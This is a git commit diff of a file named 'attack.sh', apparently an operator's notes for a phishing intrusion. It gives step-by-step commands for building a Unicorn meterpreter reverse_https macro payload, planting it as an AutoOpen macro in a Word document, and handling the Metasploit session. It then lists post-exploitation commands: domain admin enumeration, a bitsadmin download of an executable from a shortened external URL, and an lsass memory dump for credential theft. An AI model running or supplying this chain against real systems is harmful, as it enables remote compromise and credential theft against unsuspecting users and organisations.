6853c1f6f5fcb1637bfd00f158db6bf0bd5de461
RockAfeller2013 <428819+RockAfeller2013@users.noreply.github.com>
2025-07-17 16:09:45 +1000

    Update attack.sh

--- attack.sh
+++ attack.sh
@@ -1,38 +1,55 @@
 ---------
+cscript "C:\Program Files\Microsoft Office\Office16\ospp.vbs"  /dstatus
+---------
+Setup Microsoft Word
+
+- Enable Developer Option: File > Options > Customize Ribbon, then on the right, Developer under Main Tabs
+- Click Developer | Macros
+- Open Word / Developer / Macros / Create / Auto_Open / insert payload from Unicorn
+- Macro Security - Enable all macros
+- Save as a Word Macro-Enabled Document
+
+https://www.techtoolsforwriters.com/how-to-add-a-macro-to-word/
+-------
+Description of behaviors of Auto-Exec and Auto-Open macros in Word
+
+AutoOpen in Word
+https://learn.microsoft.com/en-us/office/troubleshoot/word/autoexec-autoopen-macros-word
+If you are deploying this against Office365/2016+ versions of Word you need 
+to modify the first line of the output from: Sub Auto_Open()                                                       
+                                                                                                                   
+To: Sub AutoOpen()                                                                                                 
+                                                                                                                   
+The name of the macro itself must also be "AutoOpen" instead of the legacy "Auto_Open" naming scheme. 
+-------
+
+Create a Email MSG shortcut for the following;
+
+"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE" /PIM "No Account" "C:\Users\domainuser\Desktop\email.msg"
+"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE" /PIM "CS2"
+
+---------
 [UPDATE METASPL0IT]
 sudo passwd root
-curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erdb > msfinstall && \chmod 755 msfinstall && \ ./msfinstall
+su - 
 curl -o msfinstall https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb && chmod 755 msfinstall && ./msfinstall
-
 ---------
----------
----------
-[Install Unicorn - https://github.com/trustedsec/unicorn]
-
+[Install Unicorn]
 
 git clone https://github.com/trustedsec/unicorn
 chmod +x unicorn
 python3 unicorn.py windows/meterpreter/reverse_https [kali Ip address] 443 macro
 ---------
-
-sudo mv powershell_attack.txt /home/powershell_attack.txt
-scp kali@10.3.99.1:/home/powershell.txt .
----------
-
 sudo msfconsole -r unicorn.rc
-
 ---------
+
 Copy maro powershell_attack.txt into Word attachment. 
 
-Enable Developer Option: File > Options > Customize Ribbon, then on the right, Developer under Main Tabs
-Open Word / Developer / Macros / Create / Auto_Open / insert payload .
-
-https://www.techtoolsforwriters.com/how-to-add-a-macro-to-word/
----------
-"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE" /PIM "CS2"
-outlook.exe /PIM "CS2"
+sudo mv powershell_attack.txt /home/powershell_attack.txt
+scp kali@10.3.99.1:/home/powershell.txt 
 
 ---------
+
 sessions -i 1
 load priv stdapi extapi
 
@@ -54,11 +71,9 @@ shell
 whoami
 ping -m 1 8.8.8.8
 net1 group "Domain Admins" /domain
+
+# downloads pd64.exe ProcessDump"
 bitsadmin /transfer updates /download /priority normal https://urlzs.com/vMceQ C:\Users\Public\1.exe
 cd C:\Users\Public\
-
-REM - Above command downloads pd64.exe ProcessDump"
-
-1.exe -accepteula -ma lsass.exe lsass.dmp
-
+C:\Users\Public\1.exe -accepteula -ma lsass.exe lsass.dmp
 makecab "lsass.dmp"  "2.cab" /L "c:\Users\public"
